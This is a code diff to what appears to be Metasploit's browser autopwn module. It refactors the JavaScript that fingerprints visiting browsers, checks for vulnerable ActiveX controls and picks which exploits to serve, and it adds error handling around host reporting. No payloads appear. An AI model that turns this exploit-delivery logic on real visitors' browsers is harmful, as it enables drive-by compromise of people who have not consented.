@@ -230,24 +230,7 @@ class Metasploit3 < Msf::Auxiliary
 		ENDJS
 
 		if (datastore['DEBUG'])
-			print_status("Adding debug code")
-			@init_js << <<-ENDJS
-				if (!(typeof(debug) == 'function')) {
-					function htmlentities(str) {
-						str = str.replace(/>/g, '&gt;');
-						str = str.replace(/</g, '&lt;');
-						str = str.replace(/&/g, '&amp;');
-						return str;
-					}
-					function debug(msg) {
-						foo = document.getElementById("foo");
-						bar = document.createTextNode(msg);
-						foo.appendChild(bar);
-						bar = document.createElement("br");
-						foo.appendChild(bar);
-					}
-				}
-			ENDJS
+			print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
 		else
 			pre = Time.now
 			print_status("Obfuscating initial javascript #{pre}")
@@ -424,20 +407,21 @@ class Metasploit3 < Msf::Auxiliary
 			if apo[:classid]
 				# Then this is an IE exploit that uses an ActiveX control,
 				# build the appropriate tests for it.
-				method = apo[:vuln_test].dup
 				apo[:vuln_test] = ""
 				apo[:ua_name] = HttpClients::IE
+				conditions = []
 				if apo[:classid].kind_of?(Array)  # then it's many classids
 					apo[:classid].each { |clsid|
-						apo[:vuln_test] << "if (testAXO('#{clsid}', '#{method}')) {\n"
-						apo[:vuln_test] << " is_vuln = true;\n"
-						apo[:vuln_test] << "}\n"
+						if apo[:method].kind_of?(Array)  # then it's many methods
+							conditions += apo[:method].map { |m| "testAXO('#{clsid}', '#{m}')" }
+						else
+							conditions.push "testAXO('#{clsid}', '#{method}')"
+						end
 					}
-				else
-					apo[:vuln_test] << "if (testAXO('#{apo[:classid]}', '#{method}')) {\n"
-					apo[:vuln_test] << " is_vuln = true;\n"
-					apo[:vuln_test] << "}\n"
 				end
+				apo[:vuln_test] << "if (#{conditions.join("||")}) {\n"
+				apo[:vuln_test] << " is_vuln = true;\n"
+				apo[:vuln_test] << "}\n"
 			end
 
 			# If the exploit supplies a min/max version, build up a test to
@@ -670,7 +654,7 @@ class Metasploit3 < Msf::Auxiliary
 			# two methods should succeed if the object with the given
 			# classid can be created.
 			js << <<-ENDJS
-				function testAXO(axo_name, method) {
+				window.testAXO = function(axo_name, method) {
 					if (axo_name.substring(0,1) == String.fromCharCode(123)) {
 						axobj = document.createElement("object");
 						axobj.setAttribute("classid", "clsid:" + axo_name);
@@ -691,7 +675,9 @@ class Metasploit3 < Msf::Auxiliary
 						try {
 							axobj = new ActiveXObject(axo_name);
 						} catch(e) {
-							axobj = '';
+							// If we can't build it with an object tag and we can't build it
+							// with ActiveXObject, it can't be built.
+							return false;
 						};
 					}
 					#{js_debug('axo_name + "." + method + " = " + typeof axobj[method] + "<br/>"')}
@@ -699,7 +685,7 @@ class Metasploit3 < Msf::Auxiliary
 						return true;
 					}
 					return false;
-				}
+				};
 			ENDJS
 			# End of IE-specific test functions
 		end
@@ -719,9 +705,9 @@ class Metasploit3 < Msf::Auxiliary
 				document.body.innerHTML += (str);
 			}
 			window.next_exploit = function (exploit_idx) {
-				#{js_debug("'next_exploit(' + exploit_idx +')'")}
+				#{js_debug("'next_exploit(' + exploit_idx +')<br>'")}
 				if (!global_exploit_list[exploit_idx]) {
-					#{js_debug("'End'")}
+					#{js_debug("'End<br>'")}
 					return;
 				}
 				#{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + '<br>'")}
@@ -739,8 +725,6 @@ class Metasploit3 < Msf::Auxiliary
 					//document.body.appendChild(tn);
 					if (!test) {
 						test = "true";
-					} else {
-						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
 					}
 
 					if (eval(test)) {
@@ -938,19 +922,30 @@ class Metasploit3 < Msf::Auxiliary
 					note_data[:arch]      = arch      if arch != "undefined"
 					print_status("#{cli.peerhost.ljust 16} Reporting: #{note_data.inspect}")
 
-					report_note({
-						:host => cli.peerhost,
-						:type => 'javascript_fingerprint',
-						:data => note_data,
-						:update => :unique_data,
-					})
-					client_info = ({
-						:host      => cli.peerhost,
-						:ua_string => request['User-Agent'],
-						:ua_name   => ua_name,
-						:ua_ver    => ua_ver
-					})
-					report_client(client_info)
+					# Reporting stuff isn't really essential since we store all
+					# the target information locally.  Make sure any exception
+					# raised from the report_* methods doesn't prevent us from
+					# sending exploits.  This is really only an issue for
+					# connections from localhost where we end up with
+					# ActiveRecord::RecordInvalid errors because 127.0.0.1 is
+					# blacklisted in the Host validations.
+					begin
+						report_note({
+							:host => cli.peerhost,
+							:type => 'javascript_fingerprint',
+							:data => note_data,
+							:update => :unique_data,
+						})
+						client_info = {
+							:host      => cli.peerhost,
+							:ua_string => request['User-Agent'],
+							:ua_name   => ua_name,
+							:ua_ver    => ua_ver
+						}
+						report_client(client_info)
+					rescue => e
+						elog("Reporting failed: #{e.class} : #{e.message}")
+					end
 				end
 			end
 		end
